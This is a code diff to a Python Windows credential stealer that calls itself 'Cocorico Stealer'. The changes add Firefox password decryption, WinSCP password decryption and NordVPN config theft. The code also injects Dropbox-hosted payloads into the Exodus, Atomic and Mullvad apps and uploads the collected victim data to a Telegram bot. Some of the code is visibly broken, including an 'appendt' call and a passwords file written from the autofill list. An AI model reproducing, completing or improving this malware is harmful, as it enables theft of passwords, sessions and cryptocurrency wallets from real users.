@@ -5,7 +5,6 @@ import re
 import sqlite3
 import sys
 import winreg
-import win32con # type: ignore
 import aiohttp # type: ignore
 import os
 import shutil
@@ -15,6 +14,8 @@ import winreg
 import psutil # type: ignore
 import win32api # type: ignore
 import json
+import hashlib
+import hmac
 
 from urllib.request import Request, urlopen
 from pathlib import Path
@@ -22,7 +23,10 @@ import xml.etree.ElementTree as ET
 from ctypes import *
 from datetime import datetime, time
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
+from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend # type: ignore
+from Crypto.Cipher import DES3, AES # type: ignore
+from Crypto.Protocol.KDF import PBKDF2 # type: ignore
 
 
 TOKEN = "%TOKEN%"
@@ -30,20 +34,14 @@ CHAT_ID = "%CHAT_ID%"
 
 atomic_injection_url = "https://www.dropbox.com/scl/fi/vcgr1flh520p4wc2vahyz/atomic.asar?rlkey=xdrqmiga31nix63bs124gu6ld&st=f9t1keq5&dl=1"
 exodus_injection_url = "https://www.dropbox.com/scl/fi/4sab386qgb99niee4uexg/exodus.asar?rlkey=shj7wwg5ekz5jzcd7vcndd17c&st=rkxs7sgi&dl=1"
-mullvad_injection_url = "https://www.dropbox.com/scl/fi/mkum06wrax2rxurcbky3t/mullvad.asar?rlkey=uiuztnm7ui32zac9vru4couei&st=z6nzewtv&dl=1"
+mullvad_injection_url = "https://www.dropbox.com/scl/fi/jqbb6cqf6cdrgeuika38w/mullvad.asar?rlkey=p97e7xff0gzb7061x4a00t0ic&st=f6bu0g5e&dl=1"
 
 def logs_handler(error_message: str) -> None:
-    hostname = platform.node()
-    temp_dir = os.path.join(os.getenv('TEMP'), hostname)
-
+    temp_dir = os.path.join(os.getenv('TEMP'), platform.node())
     if not os.path.exists(temp_dir):
         os.makedirs(temp_dir)
-
-    exc_message = error_message
-    error_file_path = os.path.join(temp_dir, 'console_logs.txt')
-
-    with open(error_file_path, 'a') as file:
-        file.write(f"{exc_message}\n\n")
+    with open(os.path.join(temp_dir, 'console_logs.txt'), 'a', encoding="utf-8", errors="ignore") as file:
+        file.write(f"{error_message}\n\n")
         
 class ListFonction:
     Historys = list()
@@ -52,7 +50,6 @@ class ListFonction:
     ClipBoard = list()
     Network = list()
     SystemInfo = list()
-    SteamUserAccounts = list()
 
     DiscordAccounts = list()
     RobloxAccounts = list()
@@ -67,7 +64,6 @@ class ListFonction:
     GuildedAccounts = list()
     StakeAccount = list()
     PatreonAccounts = list()
-
 
 class WindowsApi:
     @staticmethod
@@ -126,6 +122,89 @@ class WindowsApi:
             return "Decryption Error!, Data cant be decrypt"
 
 
+
+
+class GeckoDecryptionApi:
+    def decode_login_data(self, b64):
+        decoded_data = base64.b64decode(b64)
+        iv = decoded_data[1:17]
+        data = decoded_data[17:]
+        return {"iv": iv, "data": data}
+
+    def get_key(self, profile_directory, master_password):
+        key4_file_path = os.path.join(profile_directory, 'key4.db')
+
+        if not os.path.exists(key4_file_path):
+            raise FileNotFoundError('key4.db was not found in this profile directory.')
+
+        with open(key4_file_path, 'rb') as f:
+            key4_file = f.read()
+
+        conn = sqlite3.connect(':memory:')
+        cursor = conn.cursor()
+        cursor.execute("ATTACH DATABASE ? AS key4db;", (key4_file_path,))
+        cursor.execute('SELECT item1, item2 FROM metadata WHERE id = "password";')
+        meta_data = cursor.fetchall()
+
+        if meta_data:
+            global_salt = meta_data[0][0]
+            item2 = meta_data[0][1]
+            item2_asn1 = base64.b64decode(item2)
+            item2_value = self.pbes_decrypt(item2_asn1, master_password.encode(), global_salt)
+            if item2_value and item2_value.get('data') == 'password-check':
+                cursor.execute('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;')
+                nss_data = cursor.fetchall()
+                if nss_data:
+                    a11 = nss_data[0][0]
+                    a11_asn1 = base64.b64decode(a11)
+                    return self.pbes_decrypt(a11_asn1, master_password.encode(), global_salt)
+        raise ValueError('Not able to get key from profile directory or no passwords were found.')
+
+    def pbes_decrypt(self, decoded_item_seq, password, global_salt):
+        if decoded_item_seq[0] is not None:
+            return self.pbes2_decrypt(decoded_item_seq, password, global_salt)
+        return self.pbes1_decrypt(decoded_item_seq, password, global_salt)
+
+    def pbes1_decrypt(self, decoded_item_seq, password, global_salt):
+        data = decoded_item_seq[1]
+        salt = decoded_item_seq[0]
+        hp = self.sha1(global_salt + password.decode())
+        pes = self.pad(salt, 20)
+        chp = self.sha1(hp + salt)
+        k1 = self.hmac_sha1(pes + salt, chp)
+        tk = self.hmac_sha1(pes, chp)
+        k2 = self.hmac_sha1(tk + salt, chp)
+        k = k1 + k2
+        iv = k[24:]
+        key = k[:24]
+        return self.decrypt(data, iv, key, 'DES3')
+
+    def pbes2_decrypt(self, decoded_item_seq, password, global_salt):
+        data = decoded_item_seq[1]
+        pbkdf2_seq = decoded_item_seq[0]
+        salt = pbkdf2_seq[0]
+        iterations = ord(pbkdf2_seq[1])
+        iv = b'\x04\x0e' + decoded_item_seq[0][1]
+        key = PBKDF2(password, salt, dkLen=32, count=iterations)
+        return self.decrypt(data, iv, key, 'AES')
+
+    def decrypt(self, data, iv, key, algorithm):
+        if algorithm == 'DES3':
+            cipher = DES3.new(key, DES3.MODE_CBC, iv)
+            return cipher.decrypt(data)
+        elif algorithm == 'AES':
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            return cipher.decrypt(data)
+
+    def sha1(self, data):
+        return hashlib.sha1(data.encode('utf-8')).digest()
+
+    def pad(self, arr, length):
+        return arr.ljust(length, b'\x00')
+
+    def hmac_sha1(self, data, key):
+        return hmac.new(key.encode(), data.encode(), hashlib.sha1).digest()
+
 class get_data:
     def __init__(self):
         self.profiles_full_path = []
@@ -164,6 +243,7 @@ class get_data:
         self.GeckoCookieList = list()
         self.GeckoHistoryList = list()
         self.GeckoAutofiList = list()
+        self.GeckoPasswordsList = list()
 
     async def RunAllFonctions(self):
         await self.kill_browsers()
@@ -172,6 +252,7 @@ class get_data:
 
         taskk = [
             asyncio.create_task(self.GetGeckoAutoFills()),
+            asyncio.create_task(self.GetGeckoPasswords()),
             asyncio.create_task(self.GetGeckoCookies()),
             asyncio.create_task(self.GetGeckoHistorys()),
             asyncio.create_task(self.GetAutoFill()),
@@ -276,6 +357,36 @@ class get_data:
         else:
             pass
 
+
+    async def GetGeckoPasswords(self):
+        for files in self.GeckoFilesFullPath:
+            if "logins.json" in files:
+                passwords = []
+                key = GeckoDecryptionApi.get_key(files, master_password)
+                if key is None:
+                    return passwords
+
+                logins_path = os.path.join(files, "logins.json")
+                if os.path.exists(logins_path):
+                    with open(logins_path, 'r', encoding='utf-8', errors="ignore") as f:
+                        logins_data = json.load(f)
+                    
+                    for login in logins_data['logins']:
+                        decoded_username = GeckoDecryptionApi.decode_login_data(login['encryptedUsername'])
+                        decoded_password = GeckoDecryptionApi.decode_login_data(login['encryptedPassword'])
+
+                        username = GeckoDecryptionApi.decrypt(decoded_username['data'], decoded_username['iv'], key, 'DES3')
+                        password = GeckoDecryptionApi.decrypt(decoded_password['data'], decoded_password['iv'], key, 'DES3')
+
+                        passwords.append({
+                            'hostname': login['hostname'],
+                            'username': username.decode(),
+                            'password': password.decode(),
+                            'lastUsed': login['timeLastUsed'],
+                        })
+
+                self.GeckoPasswordsList.appendt(f"{passwords}\n")
+
     async def GetGeckoCookies(self) -> None:
         try:
             for files in self.GeckoFilesFullPath:
@@ -345,10 +456,6 @@ class get_data:
             logs_handler(f"[ERROR] - getting Mozilla autofills - {str(Error)}")
         else:
             pass
-
-
-
-
 
     async def StealRiotUser(self, cookie, browser: str) -> None:
         try:
@@ -1268,8 +1375,17 @@ class get_data:
 
             except Exception as Error:
                 logs_handler(f"Error injecting into mullvad {str(Error)}")
+        try:
+            all_disks = []
+            for drive in range(ord('A'), ord('Z') + 1):
+                drive_letter = chr(drive)
+                if os.path.exists(drive_letter + ':\\'):
+                    all_disks.append(drive_letter)
 
-        mullvad_path = os.path.join("C:\\", "Program Files", "Mullvad VPN")
+            for mullvad_path in all_disks:
+                mullvad_path = os.path.join(mullvad_path, "Program Files", "Mullvad VPN")
+        except Exception as Error:
+            logs_handler(f"Error getting disk lettre for mullvad")
         mullvad_asar_path = os.path.join(mullvad_path, 'resources', 'app.asar')
         mullvad_license_path = os.path.join(mullvad_path, 'LICENSE.electron.txt')
         
@@ -1277,8 +1393,9 @@ class get_data:
             with open(mullvad_license_path, 'w') as license_file:
                 license_file.write(f"{TOKEN}\n{CHAT_ID}")
         else:pass
-        
+
         await inject(mullvad_path, mullvad_asar_path, mullvad_injection_url, mullvad_license_path)
+
 
     async def StealTelegramSession(self, directory_path: str) -> None:
         try:
@@ -1545,37 +1662,38 @@ class get_data:
             logs_handler(f"[ERROR] -getting SurfsharkVPN files: {str(Error)}")
             pass
 
-    async def StealMullvadVPN(self, cookie, browser) -> None:
-        url = 'https://api.mullvad.net/www/accounts/'
-
-        cookies = {
-            "accessToken": cookie
-        }
-
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        }
-
+    async def StealNordVPN(self, directory_path) -> None:
         try:
-            async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
-                async with session.get(url, ssl=True) as response:
-                    if response.status != 200:
-                        return None
+            main_path = os.path.join(self.localappdata, "NordVPN")
+            destination_path = os.path.join(directory_path, "VPN", "NordVpn")
+            if not os.path.exists(main_path):
+                return
 
-                    account_data = await response.json()
+            files = os.listdir(main_path)
+            saves = []
 
-                    account_info = {
-                        'wg_peers': account_data.get('account', {}).get('wg_peers', []),
-                        'other_details': account_data.get('account', {}).get('other_details', {})
-                    }
+            for file in files:
+                save_path = os.path.join(main_path, file)
+                if os.path.isdir(save_path):
+                    if "exe" in file:
+                        files_exe = os.listdir(save_path)
+                        for file_exe in files_exe:
+                            user_config_path = os.path.join(save_path, file_exe, "user.config")
+                            if os.path.exists(user_config_path):
+                                saves.append(user_config_path)
 
-                    ListFonction.MullvadAccount.append(f"Account Informations:\n\n Account Data:\n{account_data}\nBrowser: {browser}")
-
+            if saves:
+                try:
+                    if not os.path.isdir(destination_path):
+                        os.mkdir(destination_path)
+                        shutil.copy2(saves, destination_path)
+                    else:
+                        pass
+                except Exception as Error:
+                    logs_handler(f"[ERROR] - copying NordVPN files to logs: {str(Error)}")
         except Exception as Error:
-            logs_handler(f"Error while getting mullvad informations: {Error}")
-            return None
+            logs_handler(f"Error getting NordVPN {str(Error)}")
+
     
 
     async def BackupThunderbird(self, directory_path: str) -> None:
@@ -1644,47 +1762,128 @@ class get_data:
             
             filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
             os.makedirs(filezilla_hosts, exist_ok=True)
-            recent_servers_xml = os.path.join(filezilla_folder, 'recentservers.xml')
-            site_manager_xml = os.path.join(filezilla_folder, 'sitemanager.xml')
 
-            def parse_server_info(xml_content):
-                host_match = re.search(r"<Host>(.*?)</Host>", xml_content)
-                port_match = re.search(r"<Port>(.*?)</Port>", xml_content)
-                user_match = re.search(r"<User>(.*?)</User>", xml_content)
-                pass_match = re.search(r"<Pass encoding=\"base64\">(.*?)</Pass>", xml_content)
+            files_to_copy = [
+                os.path.join(filezilla_folder, 'recentservers.xml'),
+                os.path.join(filezilla_folder, 'sitemanager.xml')
+            ]
 
-                server_host = host_match.group(1) if host_match else ""
-                server_port = port_match.group(1) if port_match else ""
-                server_user = user_match.group(1) if user_match else ""
-                if not server_user:
-                    return f"Host: {server_host}\nPort: {server_port}\n"
-                encoded_pass = pass_match.group(1) if pass_match else ""
-                decoded_pass = (encoded_pass and base64.b64decode(encoded_pass).decode('utf-8') if encoded_pass else "")
-                return f"Host: {server_host}\nPort: {server_port}\nUser: {server_user}\nPass: {decoded_pass}\n---------------------------------------------------|\n"
-
-            servers_info = []
-            for xml_file in [recent_servers_xml, site_manager_xml]:
-                if os.path.isfile(xml_file):
-                    with open(xml_file, 'r') as file:
-                        xml_content = file.read()
-                        server_entries = re.findall(r"<Server>(.*?)</Server>", xml_content, re.DOTALL)
-                        for server_entry in server_entries:
-                            servers_info.append(parse_server_info(server_entry))
-
-            with open(os.path.join(filezilla_hosts, 'Hosts.txt'), 'w') as file:
-                file.write("\n".join(servers_info))
+            for file in files_to_copy:
+                if os.path.isfile(file):
+                    shutil.copy(file, filezilla_hosts)
             
-            output_path = os.path.join(filezilla_hosts, 'Hosts.txt')
-            if os.path.getsize(output_path) == 0:
-                os.remove(output_path)
-                folder_dirname = os.path.dirname(output_path)
-                if not os.listdir(folder_dirname):
-                    os.rmdir(folder_dirname)
-                
         except Exception as Error:
-            logs_handler(f"[ERROR] - getting FileZilla files: {str(Error)}")
+            logs_handler(f"[ERROR] - copying FileZilla files: {str(Error)}")
             pass
+
+
+    async def StealWinSCP(self, destination_path) -> None:
+        try:
+            connections = []
+            WSCP_CHARS = []
+            reg_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+            try:
+                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
+            except FileNotFoundError:
+                return
+
+            subkeys = []
+            i = 0
+            while True:
+                try:
+                    subkey = winreg.EnumKey(reg_key, i)
+                    subkeys.append(subkey)
+                    i += 1
+                except OSError:
+                    break
+
+            if not subkeys:
+                return
+
+            for subkey in subkeys:
+                try:
+                    subkey_path = os.path.join(reg_path, subkey)
+                    sub_reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey_path)
+                    async def RegitryValue(reg_key, value_name):
+                        try:
+                            value, _ = winreg.QueryValueEx(reg_key, value_name)
+                            return value
+                        except FileNotFoundError:
+                            return ""
+                    hostname = await RegitryValue(sub_reg_key, "HostName")
+                    username = await RegitryValue(sub_reg_key, "UserName")
+                    password = await RegitryValue(sub_reg_key, "Password")
+
+                    if password and username and hostname:
+                        async def decrypt(username, hostname, encrypted):
+                            if not re.match(r"[A-F0-9]+", encrypted):
+                                return ""
+                            
+                            async def DecryptNextChar():
+                                if len(WSCP_CHARS) == 0:
+                                    return 0x00
+
+                                WSCP_SIMPLE_STRING = "0123456789ABCDEF"
+
+                                a = WSCP_SIMPLE_STRING.index(WSCP_CHARS.pop(0))
+                                b = WSCP_SIMPLE_STRING.index(WSCP_CHARS.pop(0))
+
+                                return 0xff & ~(((a << 4) + b) ^ 0xa3)
+
+                            result = []
+                            key = f"{username}{hostname}"
+
+                            WSCP_CHARS = list(encrypted)
+
+                            flag = await DecryptNextChar()
+                            if flag == 0xff:
+                                await DecryptNextChar()
+                                length = await DecryptNextChar()
+                            else:
+                                length = flag
+
+                            WSCP_CHARS = WSCP_CHARS[await DecryptNextChar() * 2:]
+
+                            for _ in range(length):
+                                result.append(chr(await DecryptNextChar()))
+
+                            if flag == 0xff:
+                                valid = ''.join(result[:len(key)])
+                                if valid != key:
+                                    result = []
+                                else:
+                                    result = result[len(key):]
+
+                            WSCP_CHARS = []
+
+                            return ''.join(result)
+                        decrypted_password = await decrypt(username, hostname, password)
+
+                        connections.append({
+                            'username': username,
+                            'password': decrypted_password,
+                            'hostname': hostname
+                        })
+
+                except Exception as e:
+                    logs_handler(f"Error processing subkey {subkey}: {e}")
             
+            try:
+                output_file = os.path.join(destination_path, "FTP Clients", "WinSCP")
+                os.makedirs(output_file, exist_ok=True)
+                output_file = os.path.join(destination_path, "FTP Clients", "WinSCP", "winscp_connexions.txt")
+                with open(output_file, 'w', encoding="utf-8", errors="ignore") as file:
+                    for conn in connections:
+                        file.write(f"Host: {conn['hostname']}\n")
+                        file.write(f"User: {conn['username']}\n")
+                        file.write(f"Pass: {conn['password']}\n")
+                        file.write("-" * 40 + "\n")
+
+            except Exception as Error:
+                logs_handler(f"Error sending WinSCP connextions to logs Folder {str(Error)}")
+        except Exception as Error:
+            logs_handler(f"Error getting WinSCP {str(Error)}")
+
     async def StealPasswordManagers(self, directory_path: str) -> None:
         try:
             password_mgr_dirs = {
@@ -1780,7 +1979,7 @@ class get_data:
     async def StealUbisoft(self, directory_path: str) -> None:
         try:
             ubisoft_path = os.path.join(self.localappdata, "Ubisoft Game Launcher")
-            copied_path = os.path.join(directory_path, "Games", "Uplay")
+            copied_path = os.path.join(directory_path, "Games", "Ubisoft")
             if os.path.isdir(ubisoft_path):
                 if not os.path.exists(copied_path):
                     os.mkdir(copied_path)
@@ -1812,23 +2011,17 @@ class get_data:
             logs_handler(f"[ERROR] - getting EpicGames files: {str(Error)}")
             pass
 
-    async def StealGrowtopia(self, directory_path: str) -> None:
-        try:
-            growtopia_path = os.path.join(self.localappdata, "Growtopia", "save.dat")
-            copied_path = os.path.join(directory_path, "Games", "Growtopia")
-            try:
-                if os.path.isfile(growtopia_path):
-                    shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
-            except Exception as Error:
-                logs_handler(f"[ERROR] - copying Growtopia files to logs: {str(Error)}")
-        except Exception as Error:
-            logs_handler(f"[ERROR] - getting Growtopia files: {str(Error)}")
-            pass
-
     async def StealSteamFiles(self, directory_path: str) -> None:
         try:
+            all_disks = []
+            for drive in range(ord('A'), ord('Z') + 1):
+                drive_letter = chr(drive)
+                if os.path.exists(drive_letter + ':\\'):
+                    all_disks.append(drive_letter)
+
+            for steam_paths in all_disks:
+                steam_path = os.path.join(steam_paths, "Program Files (x86)", "Steam", "config")
             save_path = os.path.join(directory_path)
-            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
             if os.path.isdir(steam_path):
                 to_path = os.path.join(save_path, "Games", "Steam")
                 try:
@@ -1840,45 +2033,36 @@ class get_data:
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Steam files: {str(Error)}")
             return "null"
-
+        
     async def StealRiotGames(self, directory_path) -> None:
         try:
             riotgame_path = os.path.join(self.localappdata, "Riot Games", "Riot Client", "Data")
             destination_path = os.path.join(directory_path, "Games", "Riot Games")
-            saves = []
 
             if not os.path.exists(riotgame_path):
                 return
-            else:
-                files = os.listdir(riotgame_path)
+       
 
-                for file in files:
-                    save_path = os.path.join(riotgame_path, file)
-                    saves.append(save_path)
-
-            if saves:
-                try:
-                    if not os.path.isdir(destination_path):
-                        os.mkdir(destination_path)
-                    shutil.copytree(riotgame_path, os.path.join(destination_path, "Data"))
-                except Exception as Error:
-                    logs_handler(f"[ERROR] - copying Riot files to logs: {str(Error)}")
+            if not os.path.isdir(destination_path):
+                    os.mkdir(destination_path)    
+                
+            shutil.copytree(riotgame_path, destination_path)
+        
         except Exception as Error:
             logs_handler(f"Error getting Riot Game {str(Error)}")
-            
+
+
     async def StealGalaxy(self, directory_path) -> None:
         try:
             galaxy_path = os.path.join(self.localappdata, "GOG.com", "Galaxy", "Configuration", "config.json")
             destination_path = os.path.join(directory_path, "Games", "Galaxy")
-            if not os.path.exists(galaxy_path):
+            if not os.path.isfile(galaxy_path):
                 return
-            else:
-                if os.path.isfile(galaxy_path):
-                    shutil.copy(galaxy_path, os.path.join(destination_path, "config.json"))
-                else:
-                    pass
+
+            os.makedirs(destination_path, exist_ok=True)
+            shutil.copy(galaxy_path, destination_path)
         except Exception as Error:
-            logs_handler(f"Error getting Galaxy (GOG) {str(Error)}")
+            logs_handler(f"Error getting Galaxy (GOG): {str(Error)}")
 
     async def StealRockstarGames(self, directory_path):
         try:
@@ -1886,11 +2070,8 @@ class get_data:
             destination_path = os.path.join(directory_path, "Games", "Rockstar Games")
             if not os.path.exists(rockstar_path):
                 return
-            else:
-                if os.path.isfile(rockstar_path):
-                    shutil.copy(rockstar_path, os.path.join(destination_path, "settings_user.dat"))
-                else:
-                    pass
+            os.makedirs(destination_path, exist_ok=True)
+            shutil.copy(rockstar_path, destination_path)
         except Exception as Error:
             logs_handler(f"Error getting Rockstar Games {str(Error)}")
 
@@ -1900,11 +2081,8 @@ class get_data:
             destination_path = os.path.join(directory_path, "Games", "Electronic Arts" )
             if not os.path.exists(electronic_arts_path):
                 return
-            else:
-                if os.path.isfile(electronic_arts_path):
-                    shutil.copy(electronic_arts_path, os.path.join(destination_path, "cookie.ini"))
-                else:
-                    pass
+            os.makedirs(destination_path, exist_ok=True)
+            shutil.copy(electronic_arts_path, destination_path)
         except Exception as Error:
             logs_handler(f"Error getting Electronic Arts {str(Error)}")
 
@@ -1974,6 +2152,10 @@ class get_data:
                     for value in ListFonction.Autofills:
                         file.write(value)
 
+            if self.GeckoPasswordsList:
+                with open(os.path.join(filePath, "Mozilla", "passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in self.GeckoAutofiList:
+                        file.write(value)            
             if self.GeckoAutofiList:
                 with open(os.path.join(filePath, "Mozilla", "autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in self.GeckoAutofiList:
@@ -2005,10 +2187,6 @@ class get_data:
             if ListFonction.SteamUserAccounts:
                 with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.SteamUserAccounts:
-                        file.write(value)
-            if ListFonction.MullvadAccount:
-                with open(os.path.join(filePath, "Sessions", "mullvad_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    for value in ListFonction.MullvadAccount:
                         file.write(value)
             if ListFonction.DiscordAccounts:
                 with open(os.path.join(filePath, "Sessions", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -2087,13 +2265,14 @@ class get_data:
                 self.StealProtonVPN(filePath),
                 self.StealOpenVPN(filePath),
                 self.StealSurfsharkVPN(filePath),
+                self.StealNordVPN(filePath),
                 self.StealFileZilla(filePath),
+                self.StealWinSCP(filePath),
                 self.BackupMailbird(filePath),
                 self.BackupThunderbird(filePath),
                 self.StealPasswordManagers(filePath),
                 self.StealUbisoft(filePath),
                 self.StealEpicGames(filePath),
-                self.StealGrowtopia(filePath),
                 self.StealSteamFiles(filePath),
                 self.StealRiotGames(filePath),
                 self.StealGalaxy(filePath),
@@ -2143,39 +2322,55 @@ class get_data:
 🔮 <code>https://t.me/soon...</code>
 """
 
-            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+            send_message_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+            files_in_directory = os.listdir(filePath)
+            png_files = [f for f in files_in_directory if f.endswith(".png")]
+            
+            if not png_files:
+                raise FileNotFoundError("No PNG file found in the provided directory.")
+            
+            photo_path = os.path.join(filePath, png_files[0])
             message_payload = {
                 'chat_id': CHAT_ID,
                 'text': text,
                 'parse_mode': 'HTML'
             }
 
-            async with aiohttp.ClientSession() as session:
-                async with session.post(send, data=message_payload) as response:
-                    if response.status != 200:
-                        raise Exception(f"[ERROR] - sending all information embed to telegram: {await response.text()}")
+            document_path = filePath + ".zip"
+            
+            if not os.path.exists(document_path):
+                raise FileNotFoundError(f"Document not found: {document_path}")
 
-                if os.path.getsize(filePath + ".zip") / (1024 * 1024) <= 15:
-                    send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-                    form = aiohttp.FormData()
-                    form.add_field('chat_id', CHAT_ID)
-                    form.add_field('document', open(filePath + ".zip", 'rb'), filename=f"{hostname}.zip")
-                    async with session.post(send_document_url, data=form) as response:
+            send_photo_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+            form = aiohttp.FormData()
+            form.add_field('chat_id', CHAT_ID)
+            form.add_field('photo', open(photo_path, 'rb'), filename=os.path.basename(photo_path))
+            form.add_field('caption', text)
+            form.add_field('parse_mode', 'HTML')
+            form.add_field('document', open(document_path, 'rb'), filename=f"{os.path.basename(filePath)}.zip")
+
+            async with aiohttp.ClientSession() as session:
+                try:
+                    async with session.post(send_photo_url, data=form) as response:
                         if response.status != 200:
-                            logs_handler(f"[ERROR] - sending logs zip file to telegram: {await response.text()}")
+                            raise Exception(f"[ERROR] - sending photo and document to telegram: {await response.text()}")
+                except Exception as Error:
+                    logs_handler(f"Error sending message with photo and document: {str(Error)}")
+
+
                 else:
                     file_url = await UploadFiles.upload_file(filePath + ".zip")
                     if file_url is not None:
                         text = f"<b>📥  <i><u>{platform.node().upper()} - Cocorico Stealer</u></i></b>\n\n<b>⛓️  File Link:</b> {file_url}"
                         message_payload['text'] = text
-                        async with session.post(send, data=message_payload) as response:
+                        async with session.post(send_message_url, data=message_payload) as response:
                             if response.status != 200:
                                 logs_handler(f"[ERROR] - sending file link message to telegram: {await response.text()}")
                                 raise Exception(f"[ERROR]")
                     else:
                         text = "<b>📥 Can't Send Logs</b>"
                         message_payload['text'] = text
-                        async with session.post(send, data=message_payload) as response:
+                        async with session.post(send_message_url, data=message_payload) as response:
                             if response.status != 200:
                                 logs_handler(f"[ERROR] - sending message to telegram: {await response.text()}")
                                 raise Exception(f"[ERROR]")
@@ -2187,8 +2382,6 @@ class get_data:
 
         except Exception as Error:
             logs_handler(f"[ERROR] - sending all data: {str(Error)}")
-
-            
 
 class UploadFiles:
     @staticmethod
